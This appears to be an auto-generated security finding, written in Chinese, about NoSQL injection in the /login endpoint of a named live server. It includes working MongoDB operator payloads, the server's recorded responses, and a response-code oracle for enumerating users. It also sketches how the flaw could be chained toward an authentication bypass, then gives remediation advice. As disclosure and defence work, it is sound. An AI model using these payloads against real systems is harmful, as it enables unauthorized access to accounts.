# /login 接口 username/password 存在 NoSQL 注入

- ID: `5f0f1453-c473-403b-ad13-2199690097de`
- Severity: **high**
- Status: open
- Type: NoSQL 注入
- Target: `https://epcr.tpf.gov.tw:4004/login (username, password 参数)`
- Conversation: `532cedc0-0580-4045-a5e2-45c07c488867`
- Created: 2026-09-06 16:09:57.605947937+08:00

## Description

/login 的 username 与 password 字段直接拼入 MongoDB find() 查询，未做类型/操作符过滤，存在 NoSQL 注入。已确认：(1) username:{"$ne":null} 匹配多个用户后触发 source 校验返回 403（证明多文档匹配路径）；(2) username:{"$regex":"^"} / {"$in":["x"]} / {"$exists":true} / {"$type":"string"} 均返回 500 "TypeError"（11字节，单文档匹配后代码路径崩溃，与 403 多匹配路径形成响应差异 oracle）；(3) password 字段同样可注入操作符。错误响应差异可用于盲注枚举用户存在性，且 500 泄露内部异常类型。

## Reproduction

1. 打开浏览器/Postman，POST https://epcr.tpf.gov.tw:4004/login，Content-Type: application/json
2. 发送 {"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}，观察返回 403（非 401）
3. 发送 {"username":{"$regex":"^"},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}，观察返回 500 TypeError
4. 对照发送 {"username":"admin","password":"x","captcha":"1","domain":"AUTH_SERVER"}，返回 401
5. 三种状态码差异证明 NoSQL 操作符被后端解释执行

## Evidence

POST https://epcr.tpf.gov.tw:4004/login
{"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}
-> HTTP 403 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}

{"username":{"$regex":"^"},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}
-> HTTP 500 "TypeError" (11 bytes)

{"username":{"$in":["admin"]},"password":{"$ne":null}} -> 500 TypeError
{"username":{"$exists":true},"password":{"$ne":null}} -> 500 TypeError
{"username":{"$type":"string"},"password":{"$ne":null}} -> 500 TypeError

对照组（无操作符）：
{"username":"admin","password":"x"} -> HTTP 401（正常认证失败，非500/403）

响应差异 oracle：
- 无操作符: 401
- $ne(多匹配): 403
- $regex/$in/$exists/$type(单匹配): 500 TypeError
三种不同状态码证明操作符被解释执行。

## Impact

认证层 NoSQL 注入可盲注枚举有效用户名（利用 401/403/500 响应差异 oracle），可能进一步构造查询绕过认证或读取用户文档字段。500 TypeError 泄露服务端异常类型，辅助攻击者推断后端实现（MongoDB + Node.js）。若结合 source 白名单绕过，可直接获取 JWT userToken 进而通过 2FA 结构缺陷取得完整会话。

## Recommendation

对 /login 的 username/password 输入做严格类型校验（强制为字符串），拒绝以 { 开头的对象/操作符输入；使用 mongoose schema 或手动类型断言后再传入 MongoDB 查询；捕获并统一 500 异常为通用错误信息，避免泄露 TypeError 等内部细节；对 source 白名单校验逻辑增加日志。
